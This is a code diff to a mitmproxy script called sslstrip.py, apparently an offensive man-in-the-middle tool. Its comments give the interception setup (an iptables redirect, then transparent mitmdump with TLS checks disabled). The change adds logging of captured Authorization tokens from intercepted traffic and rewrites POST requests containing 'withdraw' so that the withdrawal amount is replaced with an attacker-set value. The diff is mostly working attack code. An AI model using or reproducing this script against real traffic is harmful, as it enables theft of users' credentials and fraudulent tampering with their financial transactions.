@@ -13,7 +13,7 @@
 #  [OPTIONAL] ip6tables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
 #
 # 4. Fire up mitmproxy
-#  mitmdump --ssl-insecure --mode transparent --script sslstrip.py --set withdraw=[amount]
+#  mitmdump --ssl-insecure --mode transparent --script /root/Desktop/sslstrip.py --set withdraw=[amount]
 #
 
 import re
@@ -56,9 +56,15 @@ def request(flow: http.HTTPFlow) -> None:
         # in transparent mode, TLS server name certificate validation would fail.
         flow.request.host = flow.request.pretty_host
 
-    # Payload
-    if("withdraw" in flow.request.content.decode()):
+    # Search for authorization token
+    if 'Authorization' in flow.request.headers:
+        authorization = flow.request.headers.get('Authorization')
+        ctx.log.info(f'[AUTHORIZATION TOKEN FOUND]: {authorization}')
+
+    # Modify Post request Payload
+    if flow.request.method == 'POST' and 'withdraw' in flow.request.content.decode():
         inject = { "withdraw": ctx.options.withdraw }
+        ctx.log.info(f'[WITHRAW PAYLOAD MODIFIED]: from {flow.request.content.decode()} to {inject}')
         flow.request.content = json.dumps(inject).encode()
 
 def response(flow: http.HTTPFlow) -> None:
